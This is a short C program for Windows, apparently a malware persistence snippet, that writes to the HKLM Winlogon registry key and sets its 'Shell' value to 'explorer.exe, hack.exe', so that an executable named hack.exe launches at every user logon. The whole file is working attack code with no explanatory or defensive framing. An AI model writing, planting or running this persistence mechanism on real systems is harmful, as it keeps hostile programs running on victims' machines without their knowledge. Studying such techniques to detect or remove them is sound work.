#include <windows.h>
#include <string.h>

int main (int argc, char* argv[]){
    HKEY hkey = NULL;
    // shell
    const char* sh = "explorer.exe, hack.exe";
    // startup
    LONG res = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        (LPCSTR) "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon",
        0,
        KEY_WRITE,
        &hkey
    );
    // Check SUCCESS
    if (res == ERROR_SUCCESS) {
        // Create new registry key
        RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)sh, strlen(sh));
        RegCloseKey(hkey);
    }
    return 0;
}